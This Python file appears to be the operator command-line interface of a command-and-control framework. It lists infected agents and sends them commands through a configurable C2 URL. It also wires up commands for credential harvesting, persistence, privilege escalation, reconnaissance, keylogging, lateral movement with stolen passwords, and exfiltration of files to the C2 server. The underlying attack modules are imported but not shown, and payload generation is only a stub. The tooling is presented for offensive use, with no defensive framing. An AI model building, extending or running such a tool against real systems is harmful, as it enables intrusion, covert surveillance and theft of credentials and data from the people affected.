import typer
import requests
import yaml
import os
import sys

# Add modules directory to sys.path
sys.path.append(os.path.join(os.path.dirname(__file__), 'modules'))

import credential_harvesting
import persistence
import privilege_escalation
import reconnaissance
import exfiltration
import keylogging
import lateral_movement

cli = typer.Typer()

def get_c2_url() -> str:
    # Try to read from environment variable first
    c2_url = os.getenv("C2_URL")
    if c2_url:
        return c2_url

    # If not found in environment, read from config file
    try:
        with open(os.path.join(os.path.dirname(__file__), 'config', 'config.yaml'), "r") as config_file:
            config = yaml.safe_load(config_file)
            c2_url = config.get("c2_url")
    except FileNotFoundError:
        raise typer.Exit("config.yaml file not found and C2_URL environment variable not set.")

    if not c2_url:
        raise typer.Exit("C2_URL not set in environment or config file.")
    return c2_url

@cli.command()
def list_agents():
    """List all registered agents."""
    c2_url = get_c2_url()
    try:
        response = requests.get(f"{c2_url}/list_agents")
        response.raise_for_status()  # Raise an error for bad status codes
        agents = response.json().get("agents", [])
        if agents:
            typer.echo("Registered Agents:")
            for agent in agents:
                typer.echo(f" - {agent['AgentID']}")
        else:
            typer.echo("No registered agents found.")
    except requests.RequestException as e:
        typer.echo(f"Failed to list agents: {e}")

@cli.command()
def send_command(agent_id: str, command: str):
    """Send a command to a specific agent."""
    c2_url = get_c2_url()
    payload = {
        "AgentID": agent_id,
        "Command": command
    }
    try:
        response = requests.post(f"{c2_url}/sendcommand", json=payload)
        response.raise_for_status()  # Raise an error for bad status codes
        typer.echo(f"Command sent to agent {agent_id}.")
    except requests.RequestException as e:
        typer.echo(f"Failed to send command: {e}")

@cli.command()
def generate_payload(platform: str):
    """Generate an obfuscated payload for a specific platform."""
    typer.echo(f"Generating payload for {platform}...")

@cli.command()
def harvest_credentials():
    credentials = credential_harvesting.harvest_credentials()
    typer.echo("Credentials harvested:")
    for cred in credentials:
        typer.echo(cred)

@cli.command()
def establish_persistence():
    persistence.establish_persistence()
    typer.echo("Persistence established.")

@cli.command()
def escalate_privileges():
    privilege_escalation.escalate_privileges()
    typer.echo("Privilege escalation attempted.")

@cli.command()
def gather_system_info():
    system_info = reconnaissance.gather_system_info()
    typer.echo("System Information:")
    typer.echo(system_info)

@cli.command()
def exfiltrate_data(file_path: str):
    c2_url = get_c2_url()
    status_code = exfiltration.exfiltrate_data(file_path, c2_url)
    typer.echo(f"Data exfiltration status: {status_code}")

@cli.command()
def start_keylogger(log_file_path: str):
    """Start a keylogger and save logs to the specified file."""
    keylogging.start_keylogger(log_file_path)
    typer.echo(f"Keylogger started, logging to {log_file_path}")

@cli.command()
def move_laterally(target_ip: str, username: str, password: str):
    """Attempt lateral movement to the target IP using the provided credentials."""
    lateral_movement.move_laterally(target_ip, username, password)
    typer.echo(f"Attempted lateral movement to {target_ip}")

if __name__ == "__main__":
    cli()
